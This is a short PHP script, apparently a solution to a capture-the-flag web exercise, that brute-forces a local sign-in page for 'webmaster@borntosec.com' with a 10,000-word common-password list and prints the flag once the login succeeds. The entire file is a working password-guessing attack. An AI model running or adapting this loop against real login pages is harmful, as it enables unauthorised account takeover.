<?php

$dict = getcwd() . '/10k-most-common.txt';

if (!file_exists($dict)) {
    die("Dictionary file not found: $dict\n");
}

$lines = file($dict, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$batchSize = 10;

foreach ($lines as $line) {
    $line = trim($line);

    if ($line === '') {
        continue;
    }

    $url = "http://localhost:8080/?page=signin&username=webmaster%40borntosec.com&password=" . $line . "&Login=Login";

    $response = file_get_contents($url);
    if (strpos($response, 'flag') !== false) {
        echo "Password found: $line\n";
        $flag = preg_match('/flag is : (\S+)/', $response, $matches) ? $matches[1] : 'Flag not found in response';
        echo "Flag: $flag\n";
        exit(0);
    } else {
        echo "Tried: $line\n";
    }
}
